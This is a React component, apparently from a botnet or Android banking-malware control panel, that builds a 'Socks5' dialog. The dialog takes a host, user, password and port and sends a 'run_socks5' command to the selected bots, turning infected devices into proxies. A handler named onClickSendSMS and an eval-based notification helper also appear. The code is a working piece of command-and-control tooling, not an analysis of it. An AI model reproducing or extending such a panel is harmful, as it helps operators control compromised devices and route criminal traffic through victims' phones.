import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';


class RunSocks extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          host: '',
          user: '',
          pass: '',
          port: ''
        }
    }

    onChangeHost = (e) => {
        this.setState({ 
            host: e.target.value
        });
    }

    onChangeUser = (e) => {
        this.setState({ 
            user: e.target.value
        });
    }

    onChangePass = (e) => {
        this.setState({ 
            pass: e.target.value
        });
    }

    onChangePort = (e) => {
        this.setState({ 
            port: e.target.value
        });
    }

    onClickSendSMS = (e) => {
        if(SettingsContext.BotsSelected()) {
            try_eval('$.notify("Added command [run_socks5]", "info");');
            SettingsContext.BotSendCommand('{"cmd":"run_socks5","hs":"' + this.state.host + '","ur":"' + this.state.user + '","pd":"' + this.state.pass + '","pt":"' + this.state.port + '"}');
            this.setState({ 
                host: '',
                user: '',
                pass: '',
                port: ''
            });
        }
    }

    render () {
        return (
            <React.Fragment>
              
                <div class="modal fade" id="modalSocks5" tabindex="-1" role="dialog" aria-labelledby="modalSocks5" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Socks5</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.host} onChange={this.onChangeHost} placeholder="host" />
                                <input class="form-control" value={this.state.user} onChange={this.onChangeUser} placeholder="user" />
                                <input class="form-control" value={this.state.pass} onChange={this.onChangePass} placeholder="passowrd" />
                                <input class="form-control" value={this.state.port} onChange={this.onChangePort} placeholder="port" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickSendSMS} class="btn btn-outline-primary"  data-dismiss="modal">Send command</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default RunSocks;